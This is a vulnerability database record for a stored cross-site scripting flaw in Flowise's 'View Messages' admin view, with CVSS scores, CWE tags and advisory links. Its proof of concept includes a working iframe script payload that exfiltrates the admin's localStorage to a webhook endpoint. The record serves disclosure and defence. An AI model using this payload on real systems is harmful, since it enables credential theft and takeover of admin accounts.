vulnerability_id: VCID-tcys-c4hf-u7a9
aliases:
  - GHSA-964p-j4gg-mhwc
summary: |
  Flowise  vulnerable to stored XSS via "View Messages" allows credential theft in FlowiseAI admin panel
  ### Summary
  A stored Cross-Site Scripting (XSS) vulnerability in FlowiseAI allows a user to inject arbitrary JavaScript code via message input. When an administrator views messages using the "View Messages" button in the workflow UI, the malicious script executes in the context of the adminâ€™s browser, enabling credential theft via access to `localStorage`.

  ---

  ### Details
  The vulnerability stems from a lack of input sanitization when displaying stored user messages in the admin interface. A specially crafted payload using `<iframe srcdoc="...">` can include arbitrary JavaScript, which is executed when the message is rendered.

  ---

  ### PoC
  1. Deploy a FlowiseAI agent and make it accessible via browser (e.g., embed on a website).
  2. Send the following payload via the agent's chat interface:
     ```html
     <iframe srcdoc="<script>fetch('http://requestbin.whapi.cloud/XXXXX?d='+encodeURIComponent(JSON.stringify(localStorage)))</script>">
     ```
  3. As an admin, go to the workflow and click **"View Messages"**.
  4. The JavaScript is executed in the admin's browser, exfiltrating `localStorage` content to the attacker-controlled webhook endpoint.

  ---

  ### Impact
  - **Type:** Stored Cross-Site Scripting (XSS)
  - **Who is impacted:** Any admin viewing messages in the FlowiseAI UI
  - **Data at risk:** Admin credentials, or sensitive info stored in `localStorage`
  - **Severity:** High (Account takeover, admin privilege escalation, full panel compromise)

  ---

  ### Affected Products
  - **Ecosystem:** `npm`
  - **Package name:** `flowise`
  - **Affected versions:** `< 2.2.7`
  - **Patched versions:**`1`
severities:
  - score: CRITICAL
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-964p-j4gg-mhwc
  - score: '9.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
    published_at: None
    url: https://github.com/FlowiseAI/Flowise
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/FlowiseAI/Flowise
  - score: '9.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
    published_at: None
    url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-964p-j4gg-mhwc
  - score: CRITICAL
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-964p-j4gg-mhwc
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-964p-j4gg-mhwc
weaknesses:
  - CWE-79
  - CWE-1035
  - CWE-937
references:
  - url: https://github.com/FlowiseAI/Flowise
    reference_type:
    reference_id:
  - url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-964p-j4gg-mhwc
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-964p-j4gg-mhwc
    reference_type:
    reference_id: GHSA-964p-j4gg-mhwc
